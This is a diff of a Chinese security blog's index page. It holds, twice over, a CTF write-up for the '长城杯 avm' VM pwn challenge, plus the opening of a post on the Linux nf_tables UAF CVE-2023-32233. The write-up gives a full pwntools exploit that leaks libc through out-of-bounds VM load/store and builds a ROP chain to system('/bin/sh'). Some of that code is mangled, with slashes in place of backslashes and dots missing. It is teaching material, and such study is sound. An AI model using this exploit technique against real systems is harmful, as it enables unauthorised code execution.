-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>1.8k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>7 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="一-前言"><a href="#一-前言" class="headerlink" title="一.前言"></a>一.前言</h2><p>​	本题主要是一个虚拟机的题，由于比赛时间并不是很长，因此这个题在逆向方面确实没有给大家过多的难度，利用原理也十分简单，由于虚拟机中load和store指令会读取或者存入栈中的一个数组，并且这个数组的长度不够长，导致攻击者可以任意地址写栈中0xfff大小的区域，因此可以泄露Libc并且通过rop实现攻击</p>
-<h2 id="二-逆向一下结构体"><a href="#二-逆向一下结构体" class="headerlink" title="二.逆向一下结构体"></a>二.逆向一下结构体</h2><p>​	首先就是程序的入口main函数，他首先初始化，之后读取0x300长度的opcode。之后进入到sub_1230函数。</p>
-<p><img src="/images/avm/image-20241216092601552.png" alt="image-20241216092601552"></p>
-<p>​	这里面就是对于虚拟机中的寄存器进行初始化操作，首先a1是传入的一个bss的一个地址，然后这个题其实虚拟机的逆向难度也不复杂，直接看初始化和后面的run函数就可以分析出来，初始化的时候首先初始化了rip，然后以及opcode的指针和最后结束的指针，之后就是循环的初始化寄存器的值</p>
-<p><img src="/images/avm/image-20241216092741025.png" alt="image-20241216092741025"></p>
-<p>​	之后通过View -&gt; open subviews -&gt; local types里面加入对应结构体信息，然后把所有的指针都转换成结构体信息。</p>
-<p><img src="/images/avm/image-20241216094335171.png" alt="image-20241216094335171">	</p>
-<p>​	初始化结束之后就进入到了run的函数里面，首先就是开辟了s一个栈空间，用来作为后面load和store存取数据的位置，并且对其初始化，然后循环遍历解析opcode，和0xFFFFFFFFFFFFFFFCLL取&amp;主要是为了后面的值是4的倍数，说明这个虚拟机时一个32位的虚拟机，之后进入到对应的注册函数中取根据opcode的28位的值。</p>
-<p><img src="/images/avm/image-20241216092949466.png" alt="image-20241216092949466"></p>
-<p>​	这里可以看到逆向之后的结果如下，就是简单的几个寄存器的功能。进入到具体的函数中，因为之前已经恢复了结构体的信息，所以进入函数之后很清楚的可以看到具体的内容。</p>
-<p><img src="/images/avm/image-20241216093936842.png" alt="image-20241216093936842"></p>
-<p>​	简单以store指令作为例子来解释，首先读取v3，也就是当前执行的opcode的值，之后取出右边移位5之后取出来的值对应的寄存器的值，加上右移十六位之后的opcdoe值相加，len是个固定的也就是0xff，所以这里面我的做法就是控制前面寄存器为1也就是v3 &gt;&gt; 5为1，这样由于之前清理过寄存器的值，所以我们只需要控制v3的十六位的值就可以控制整个值的内容，之后进入到If语句里面就简单的时读取传入a2也就是栈里面的值，然后把opcode最低位的对应的寄存器里面值赋值给栈中。</p>
-<p><img src="/images/avm/image-20241216094621553.png" alt="image-20241216094621553"></p>
-<p>​	其他所有的函数都大差不差，按照上面的思路都可以进行逆向。后面Load函数ida逆向的有点奇怪，但是实际上看一下汇编就可以看明白了，通过移位其实也就是一个字节一个字节的取赋值，因此ida逆向出来对于寄存器赋值的操作这么奇怪，在做题的时候完全可以把store反过来看就可以了。</p>
-<p><img src="/images/avm/image-20241216095633714.png" alt="image-20241216095633714"></p>
-<h2 id="三-漏洞利用"><a href="#三-漏洞利用" class="headerlink" title="三.漏洞利用"></a>三.漏洞利用</h2><p>​	经过上面的阐述其实也都直到漏洞的问题所在了，具体的利用思路就是通过load指令读取栈中的一些地址，比如libc中函数的地址，通过sub, add指令的功能减去偏移（这部分最开始思路想歪了，一直想着输出出来，但是其实把基地址算出来存在寄存器里面也一样）,获得到偏移之后就是利用system(“&#x2F;bin&#x2F;sh”)来执行命令，需要注意的是，这里面栈布局很神奇，在做题的时候发现很多Libc的地址根据s也就是栈中变量的偏移不固定，可以往远处找一找，比如后面的libc_start_main函数就可以了。</p>
-<p>​	因此就是按照上述的思路来撰写代码，首先把需要用的几个指令封装一下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">operation</span>(<span class="params">opcode, i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> p32((opcode &lt;&lt; <span class="number">28</span>) + (i &lt;&lt; <span class="number">5</span>) + (j &lt;&lt; <span class="number">16</span>) + k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">1</span>, i, j, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">2</span>, i, j, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">9</span>, i, j, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">10</span>, i, j, k)</span><br></pre></td></tr></table></figure>
-
-<p>​	之后就是选择读取栈中的值，我们可以定位在b *$rebase(0x19ea)这里，根据rsi指向的地址来往后面查，这里需要注意我之前说的内容，在0x500左右的地址会出现libc的函数地址，但是会发现这个偏移不固定，还要爆破，因此我们可以继续往下面找，直到找到libc_start_main函数这里</p>
-<p><img src="/images/avm/image-20241216101845864.png" alt="image-20241216101845864"></p>
-<p>​	这里的位置是0xd68，然后减去rsi和对应的偏移0x30就是我们后面写的位置0xd38了，这样我们就存了libc_start_main函数的地址了，后面就是利用寄存器sub掉和libc基地址的偏移，之后加上pop_rdi binash ret system等地址就可以了</p>
-<p>​	这里再利用的时候需要注意，和常见的64位程序一样需要加一个ret，要么地址不是被0x10整除的会报错最终的exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;/pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;123562999&quot;, 32801)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/libcso6&quot;</span>)</span><br><span class="line">libc_start_main = <span class="number">0x29d90</span></span><br><span class="line">pop_rdi = <span class="number">0x2a3e5</span></span><br><span class="line">ret = <span class="number">0x29139</span></span><br><span class="line">system = <span class="number">0x50d70</span></span><br><span class="line">binsh = <span class="built_in">next</span>(libcsearch(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">operation</span>(<span class="params">opcode, i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> p32((opcode &lt;&lt; <span class="number">28</span>) + (i &lt;&lt; <span class="number">5</span>) + (j &lt;&lt; <span class="number">16</span>) + k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">1</span>, i, j, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">2</span>, i, j, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">9</span>, i, j, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">10</span>, i, j, k)</span><br><span class="line"></span><br><span class="line">opcode = load(<span class="number">1</span>, <span class="number">0xd38</span>, <span class="number">4</span>) + load(<span class="number">1</span>, <span class="number">0x160</span>, <span class="number">5</span>) + /</span><br><span class="line">         sub(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>) + load(<span class="number">1</span>, <span class="number">0x168</span>, <span class="number">7</span>) + /</span><br><span class="line">         add(<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>) + load(<span class="number">1</span>, <span class="number">0x170</span>, <span class="number">9</span>) + /</span><br><span class="line">         add(<span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>) + load(<span class="number">1</span>, <span class="number">0x178</span>, <span class="number">11</span>) + /</span><br><span class="line">         add(<span class="number">6</span>, <span class="number">11</span>, <span class="number">12</span>) + load(<span class="number">1</span>, <span class="number">0x180</span>, <span class="number">13</span>) + /</span><br><span class="line">         add(<span class="number">6</span>, <span class="number">13</span>, <span class="number">14</span>) + store(<span class="number">1</span>, <span class="number">0x118</span>, <span class="number">8</span>) + /</span><br><span class="line">         store(<span class="number">1</span>, <span class="number">0x120</span>, <span class="number">10</span>) + store(<span class="number">1</span>, <span class="number">0x128</span>, <span class="number">12</span>) + /</span><br><span class="line">         store(<span class="number">1</span>, <span class="number">0x130</span>, <span class="number">14</span>) + p32(<span class="number">0</span>) + /</span><br><span class="line">         p64(libc_start_main) + p64(pop_rdi) + /</span><br><span class="line">         p64(binsh) + p64(ret) + p64(system)</span><br><span class="line"></span><br><span class="line">iosend(opcode)</span><br><span class="line">iorecvuntil(<span class="string">b&#x27;opcode: Unsupported instruction/n&#x27;</span>)</span><br><span class="line">iointeractive()</span><br></pre></td></tr></table></figure>
-
-<p>​	这里可以观察到我再store之后存入了一个p32(0)这个其实是为了让地址更完整，要么读取数据的时候会发现有其他数据干扰，之后对于load和store第一个参数都是1也是就是我们之前说的，需要找一个固定寄存器内容位0的寄存器，这样我们只需要控制第二个的内容就可以控制寄存器的值了。</p>
-<h2 id="四-总结"><a href="#四-总结" class="headerlink" title="四.总结"></a>四.总结</h2><p>​	自此基本完成了所有对于avm原理的阐述，这个题目其实逆向难度不大，当时比赛过程中主要就是一直最开始想着输出基地址一度卡住了，之后也是被随便找到libc函数地址和栈地址偏移随机这个问题给困扰很久，但是通过这个题目也是学到了很多的东西，对于vm这种虚拟机的题目也有了更进一步的了解，希望后面可以争取加快逆向时的速度以及减少掉入一些缺乏经验的错误。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2026/02/07/35C3CTF-namespace/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="a2ure">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="a2ure's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2026/02/07/35C3CTF-namespace/" class="post-title-link" itemprop="url">35C3CTF-namespace</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2026-02-07 10:10:47" itemprop="dateCreated datePublished" datetime="2026-02-07T10:10:47+08:00">2026-02-07</time>
+              <time title="Created: 2026-02-12 14:54:21" itemprop="dateCreated datePublished" datetime="2026-02-12T14:54:21+08:00">2026-02-12</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -582,6 +325,400 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/02/12/%E9%95%BF%E5%9F%8E%E6%9D%AFavm%20wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="a2ure">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="a2ure's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2026/02/12/%E9%95%BF%E5%9F%8E%E6%9D%AFavm%20wp/" class="post-title-link" itemprop="url">长城杯avm wp</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2026-02-12 14:54:21" itemprop="dateCreated datePublished" datetime="2026-02-12T14:54:21+08:00">2026-02-12</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>1.8k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>7 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="一-前言"><a href="#一-前言" class="headerlink" title="一.前言"></a>一.前言</h2><p>​	本题主要是一个虚拟机的题，由于比赛时间并不是很长，因此这个题在逆向方面确实没有给大家过多的难度，利用原理也十分简单，由于虚拟机中load和store指令会读取或者存入栈中的一个数组，并且这个数组的长度不够长，导致攻击者可以任意地址写栈中0xfff大小的区域，因此可以泄露Libc并且通过rop实现攻击</p>
+<h2 id="二-逆向一下结构体"><a href="#二-逆向一下结构体" class="headerlink" title="二.逆向一下结构体"></a>二.逆向一下结构体</h2><p>​	首先就是程序的入口main函数，他首先初始化，之后读取0x300长度的opcode。之后进入到sub_1230函数。</p>
+<p><img src="/images/avm/image-20241216092601552.png" alt="image-20241216092601552"></p>
+<p>​	这里面就是对于虚拟机中的寄存器进行初始化操作，首先a1是传入的一个bss的一个地址，然后这个题其实虚拟机的逆向难度也不复杂，直接看初始化和后面的run函数就可以分析出来，初始化的时候首先初始化了rip，然后以及opcode的指针和最后结束的指针，之后就是循环的初始化寄存器的值</p>
+<p><img src="/images/avm/image-20241216092741025.png" alt="image-20241216092741025"></p>
+<p>​	之后通过View -&gt; open subviews -&gt; local types里面加入对应结构体信息，然后把所有的指针都转换成结构体信息。</p>
+<p><img src="/images/avm/image-20241216094335171.png" alt="image-20241216094335171">	</p>
+<p>​	初始化结束之后就进入到了run的函数里面，首先就是开辟了s一个栈空间，用来作为后面load和store存取数据的位置，并且对其初始化，然后循环遍历解析opcode，和0xFFFFFFFFFFFFFFFCLL取&amp;主要是为了后面的值是4的倍数，说明这个虚拟机时一个32位的虚拟机，之后进入到对应的注册函数中取根据opcode的28位的值。</p>
+<p><img src="/images/avm/image-20241216092949466.png" alt="image-20241216092949466"></p>
+<p>​	这里可以看到逆向之后的结果如下，就是简单的几个寄存器的功能。进入到具体的函数中，因为之前已经恢复了结构体的信息，所以进入函数之后很清楚的可以看到具体的内容。</p>
+<p><img src="/images/avm/image-20241216093936842.png" alt="image-20241216093936842"></p>
+<p>​	简单以store指令作为例子来解释，首先读取v3，也就是当前执行的opcode的值，之后取出右边移位5之后取出来的值对应的寄存器的值，加上右移十六位之后的opcdoe值相加，len是个固定的也就是0xff，所以这里面我的做法就是控制前面寄存器为1也就是v3 &gt;&gt; 5为1，这样由于之前清理过寄存器的值，所以我们只需要控制v3的十六位的值就可以控制整个值的内容，之后进入到If语句里面就简单的时读取传入a2也就是栈里面的值，然后把opcode最低位的对应的寄存器里面值赋值给栈中。</p>
+<p><img src="/images/avm/image-20241216094621553.png" alt="image-20241216094621553"></p>
+<p>​	其他所有的函数都大差不差，按照上面的思路都可以进行逆向。后面Load函数ida逆向的有点奇怪，但是实际上看一下汇编就可以看明白了，通过移位其实也就是一个字节一个字节的取赋值，因此ida逆向出来对于寄存器赋值的操作这么奇怪，在做题的时候完全可以把store反过来看就可以了。</p>
+<p><img src="/images/avm/image-20241216095633714.png" alt="image-20241216095633714"></p>
+<h2 id="三-漏洞利用"><a href="#三-漏洞利用" class="headerlink" title="三.漏洞利用"></a>三.漏洞利用</h2><p>​	经过上面的阐述其实也都直到漏洞的问题所在了，具体的利用思路就是通过load指令读取栈中的一些地址，比如libc中函数的地址，通过sub, add指令的功能减去偏移（这部分最开始思路想歪了，一直想着输出出来，但是其实把基地址算出来存在寄存器里面也一样）,获得到偏移之后就是利用system(“&#x2F;bin&#x2F;sh”)来执行命令，需要注意的是，这里面栈布局很神奇，在做题的时候发现很多Libc的地址根据s也就是栈中变量的偏移不固定，可以往远处找一找，比如后面的libc_start_main函数就可以了。</p>
+<p>​	因此就是按照上述的思路来撰写代码，首先把需要用的几个指令封装一下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">operation</span>(<span class="params">opcode, i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> p32((opcode &lt;&lt; <span class="number">28</span>) + (i &lt;&lt; <span class="number">5</span>) + (j &lt;&lt; <span class="number">16</span>) + k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">1</span>, i, j, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">2</span>, i, j, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">9</span>, i, j, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">10</span>, i, j, k)</span><br></pre></td></tr></table></figure>
+
+<p>​	之后就是选择读取栈中的值，我们可以定位在b *$rebase(0x19ea)这里，根据rsi指向的地址来往后面查，这里需要注意我之前说的内容，在0x500左右的地址会出现libc的函数地址，但是会发现这个偏移不固定，还要爆破，因此我们可以继续往下面找，直到找到libc_start_main函数这里</p>
+<p><img src="/images/avm/image-20241216101845864.png" alt="image-20241216101845864"></p>
+<p>​	这里的位置是0xd68，然后减去rsi和对应的偏移0x30就是我们后面写的位置0xd38了，这样我们就存了libc_start_main函数的地址了，后面就是利用寄存器sub掉和libc基地址的偏移，之后加上pop_rdi binash ret system等地址就可以了</p>
+<p>​	这里再利用的时候需要注意，和常见的64位程序一样需要加一个ret，要么地址不是被0x10整除的会报错最终的exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;/pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;123562999&quot;, 32801)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/libcso6&quot;</span>)</span><br><span class="line">libc_start_main = <span class="number">0x29d90</span></span><br><span class="line">pop_rdi = <span class="number">0x2a3e5</span></span><br><span class="line">ret = <span class="number">0x29139</span></span><br><span class="line">system = <span class="number">0x50d70</span></span><br><span class="line">binsh = <span class="built_in">next</span>(libcsearch(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">operation</span>(<span class="params">opcode, i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> p32((opcode &lt;&lt; <span class="number">28</span>) + (i &lt;&lt; <span class="number">5</span>) + (j &lt;&lt; <span class="number">16</span>) + k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">1</span>, i, j, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">2</span>, i, j, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">9</span>, i, j, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">10</span>, i, j, k)</span><br><span class="line"></span><br><span class="line">opcode = load(<span class="number">1</span>, <span class="number">0xd38</span>, <span class="number">4</span>) + load(<span class="number">1</span>, <span class="number">0x160</span>, <span class="number">5</span>) + /</span><br><span class="line">         sub(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>) + load(<span class="number">1</span>, <span class="number">0x168</span>, <span class="number">7</span>) + /</span><br><span class="line">         add(<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>) + load(<span class="number">1</span>, <span class="number">0x170</span>, <span class="number">9</span>) + /</span><br><span class="line">         add(<span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>) + load(<span class="number">1</span>, <span class="number">0x178</span>, <span class="number">11</span>) + /</span><br><span class="line">         add(<span class="number">6</span>, <span class="number">11</span>, <span class="number">12</span>) + load(<span class="number">1</span>, <span class="number">0x180</span>, <span class="number">13</span>) + /</span><br><span class="line">         add(<span class="number">6</span>, <span class="number">13</span>, <span class="number">14</span>) + store(<span class="number">1</span>, <span class="number">0x118</span>, <span class="number">8</span>) + /</span><br><span class="line">         store(<span class="number">1</span>, <span class="number">0x120</span>, <span class="number">10</span>) + store(<span class="number">1</span>, <span class="number">0x128</span>, <span class="number">12</span>) + /</span><br><span class="line">         store(<span class="number">1</span>, <span class="number">0x130</span>, <span class="number">14</span>) + p32(<span class="number">0</span>) + /</span><br><span class="line">         p64(libc_start_main) + p64(pop_rdi) + /</span><br><span class="line">         p64(binsh) + p64(ret) + p64(system)</span><br><span class="line"></span><br><span class="line">iosend(opcode)</span><br><span class="line">iorecvuntil(<span class="string">b&#x27;opcode: Unsupported instruction/n&#x27;</span>)</span><br><span class="line">iointeractive()</span><br></pre></td></tr></table></figure>
+
+<p>​	这里可以观察到我再store之后存入了一个p32(0)这个其实是为了让地址更完整，要么读取数据的时候会发现有其他数据干扰，之后对于load和store第一个参数都是1也是就是我们之前说的，需要找一个固定寄存器内容位0的寄存器，这样我们只需要控制第二个的内容就可以控制寄存器的值了。</p>
+<h2 id="四-总结"><a href="#四-总结" class="headerlink" title="四.总结"></a>四.总结</h2><p>​	自此基本完成了所有对于avm原理的阐述，这个题目其实逆向难度不大，当时比赛过程中主要就是一直最开始想着输出基地址一度卡住了，之后也是被随便找到libc函数地址和栈地址偏移随机这个问题给困扰很久，但是通过这个题目也是学到了很多的东西，对于vm这种虚拟机的题目也有了更进一步的了解，希望后面可以争取加快逆向时的速度以及减少掉入一些缺乏经验的错误。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/02/12/CVE-2023-32233/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="a2ure">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="a2ure's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2026/02/12/CVE-2023-32233/" class="post-title-link" itemprop="url">Linux Netfilter 匿名集合 UAF 漏洞 (CVE-2023-32233) 复现与利用分析</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2026-02-12 11:30:00 / Modified: 15:05:12" itemprop="dateCreated datePublished" datetime="2026-02-12T11:30:00+08:00">2026-02-12</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CVE/" itemprop="url" rel="index"><span itemprop="name">CVE</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>3.2k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>12 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="综合描述"><a href="#综合描述" class="headerlink" title="综合描述"></a>综合描述</h1><p>​	CVE-2023-32233 揭示了 Linux 内核 Netfilter (nf_tables) 子系统中一个关键的 Use-After-Free (UAF) 逻辑缺陷。该漏洞的核心在于内核在处理“匿名集合”（Anonymous Sets）的生命周期时存在设计疏忽。通过构造特定的批处理事务并利用内核处理大量数据时的延迟，攻击者可以在匿名集合仍被规则引用的情况下，诱导内核将其提前释放。利用这一不稳定的内存状态，攻击者可以实现稳定的堆喷射与类型混淆，进而绕过 KASLR 防护并劫持内核控制流。</p>
